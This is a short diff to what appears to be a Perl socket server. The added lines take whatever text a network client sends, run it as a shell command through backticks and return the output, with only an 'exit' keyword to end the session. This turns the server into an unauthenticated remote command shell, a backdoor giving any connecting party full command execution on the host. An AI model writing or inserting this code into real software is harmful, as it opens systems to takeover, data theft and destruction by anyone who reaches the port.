@@ -50,7 +50,18 @@ while ($client_addr = accept(NEW_SOCKET, SOCKET)) {
         recv(NEW_SOCKET,$buffer,$length,$flags);
         $buffer =~ s/\n//g;
         print "Buffer: [$buffer]\n";
-  
+
+        # Quit if asked
+        if($buffer eq 'exit'){
+            send(NEW_SOCKET,"Goodbye!\n",$flags);
+            close NEW_SOCKET;
+            exit(0);
+        }
+        
+        # Exceute cmd
+        my $stdout = `$buffer`;
+        send(NEW_SOCKET,"$stdout\n",$flags);
+        $buffer = "";    
     }
 
     close NEW_SOCKET;
